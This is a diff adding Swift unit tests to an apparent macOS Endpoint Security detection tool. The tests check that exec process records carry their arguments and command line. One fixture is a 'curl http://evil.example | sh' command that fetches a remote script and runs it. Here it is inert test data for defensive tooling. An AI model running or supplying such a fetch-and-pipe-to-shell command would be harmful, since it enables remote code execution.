@@ -130,3 +130,91 @@ struct ESCollectorDispatchTests {
         #expect(ESCollector.introspectionEnrichments(actor: actor, target: unsignedTarget)["TargetSignerType"] == "unsigned")
     }
 }
+
+// MARK: - Tier-A #12: single-build exec ProcessInfo (args + commandLine)
+
+/// The EXEC case in `normalise` used to build a full target `ProcessInfo` and
+/// then reconstruct an ENTIRE second one copying ~20 fields just to attach
+/// `args` + `commandLine`. #12 threads those through `esProcessInfo` /
+/// `processFromESProcess` so the target is built ONCE. These tests exercise the
+/// `esProcessInfo(from:args:commandLine:)` seam (the pure part `processFromES`
+/// composes; the live `es_process_t` is kernel-only) and assert the one-step
+/// build is byte-identical to the old two-step reconstruction.
+@Suite("ESCollector: exec ProcessInfo carries args + commandLine (Tier-A #12)")
+struct ESExecArgsThreadingTests {
+
+    private static let signedFlag: UInt32 = 0x1
+
+    /// A single ES-shaped target field set. Built once so `startTime` (which
+    /// `ESProcessFields` defaults to `Date()`) is identical across builds.
+    private func targetFields() -> ESProcessFields {
+        ESProcessFields(
+            pid: 4242,
+            ppid: 900,
+            rpid: 900,
+            euid: 501,
+            executablePath: "/bin/zsh",
+            signingId: "com.apple.zsh",
+            teamId: "",
+            codesigningFlags: Self.signedFlag,
+            isPlatformBinary: true
+        )
+    }
+
+    @Test("exec build populates args + commandLine on the single struct")
+    func execBuildPopulatesArgsAndCommandLine() {
+        let args = ["/bin/zsh", "-c", "curl http://evil.example | sh"]
+        let commandLine = args.joined(separator: " ")
+
+        let built = esProcessInfo(from: targetFields(), args: args, commandLine: commandLine)
+
+        #expect(built.args == args)
+        #expect(built.commandLine == commandLine)
+    }
+
+    @Test("non-exec callers still get empty args + commandLine (default params)")
+    func nonExecCallersUnchanged() {
+        let built = esProcessInfo(from: targetFields())
+        #expect(built.args.isEmpty)
+        #expect(built.commandLine.isEmpty)
+    }
+
+    /// The load-bearing detection-safety assertion for #12: building the target
+    /// ONCE with args/commandLine must be field-for-field identical to the old
+    /// two-step path (build plain → reconstruct copying every field, overriding
+    /// only args + commandLine). ProcessInfo is Hashable/Equatable, so full
+    /// struct equality proves no field silently changed.
+    @Test("single-build result equals the old two-step reconstruction, field-for-field")
+    func singleBuildEqualsTwoStepReconstruction() {
+        let fields = targetFields()
+        let args = ["/bin/zsh", "-lc", "echo hello world"]
+        let commandLine = args.joined(separator: " ")
+
+        // Old path: plain build, then a full reconstruction attaching args/cmd.
+        let plain = esProcessInfo(from: fields)
+        let oldStyle = MacCrabCore.ProcessInfo(
+            pid: plain.pid,
+            ppid: plain.ppid,
+            rpid: plain.rpid,
+            name: plain.name,
+            executable: plain.executable,
+            commandLine: commandLine,
+            args: args,
+            workingDirectory: plain.workingDirectory,
+            userId: plain.userId,
+            userName: plain.userName,
+            groupId: plain.groupId,
+            startTime: plain.startTime,
+            codeSignature: plain.codeSignature,
+            ancestors: plain.ancestors,
+            architecture: plain.architecture,
+            isPlatformBinary: plain.isPlatformBinary,
+            auditIdentity: plain.auditIdentity
+        )
+
+        // New path: build once with args/cmd threaded through.
+        let built = esProcessInfo(from: fields, args: args, commandLine: commandLine)
+
+        #expect(built == oldStyle)
+    }
+}
